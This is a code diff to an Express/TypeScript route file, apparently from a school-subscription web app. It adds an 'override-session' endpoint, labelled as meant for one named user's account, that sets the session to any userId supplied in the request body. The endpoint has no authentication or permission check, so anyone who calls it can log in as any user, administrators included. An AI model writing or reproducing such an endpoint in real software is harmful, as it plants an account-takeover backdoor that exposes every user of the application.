@@ -522,6 +522,48 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   };
   
+  // Special endpoint for Laura's account to override session
+  app.post("/api/auth/override-session", async (req, res) => {
+    try {
+      const { userId, username, isOwner, isAdmin } = req.body;
+      
+      if (!userId || !username) {
+        return res.status(400).json({ message: "Missing required fields" });
+      }
+      
+      // Check if the user exists
+      const user = await storage.getUser(userId);
+      if (!user) {
+        return res.status(404).json({ message: "User not found" });
+      }
+      
+      // Set the session
+      req.session.userId = userId;
+      
+      // Force session save
+      await new Promise<void>((resolve, reject) => {
+        req.session.save((err) => {
+          if (err) {
+            console.error('Session save error in override-session:', err);
+            reject(err);
+          } else {
+            console.log(`Session successfully overridden for user ${username} (ID: ${userId})`);
+            resolve();
+          }
+        });
+      });
+      
+      // Return successful response
+      res.status(200).json({ 
+        success: true, 
+        message: `Session successfully overridden for user ${username}` 
+      });
+    } catch (error) {
+      console.error('Error in override-session endpoint:', error);
+      res.status(500).json({ message: "Failed to override session" });
+    }
+  });
+
   // Middleware to check if user's school has a valid subscription
   const requirePaidAccess = async (req: Request, res: Response, next: NextFunction) => {
     if (!req.session.userId) {
